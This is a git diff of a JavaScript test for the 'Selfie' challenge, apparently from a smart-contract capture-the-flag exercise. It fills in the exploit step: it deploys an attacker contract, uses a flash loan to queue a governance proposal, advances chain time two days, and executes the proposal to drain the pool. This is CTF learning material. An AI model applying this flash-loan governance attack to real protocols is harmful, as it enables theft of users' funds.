@@ -30,7 +30,21 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const AttackerFactory = await ethers.getContractFactory("Exploit", attacker);
+        const attackContract = await AttackerFactory
+        .deploy(
+            this.governance.address, 
+            this.pool.address, 
+            this.token.address
+        )
+        
+        //request the flashloan and queue a proposal
+        await attackContract.connect(attacker).attack(TOKENS_IN_POOL);
+        
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // fast forward 2 days
+        
+        //execute the proposal and withdraw the funds
+        await attackContract.connect(attacker).executeAction();
     });
 
     after(async function () {
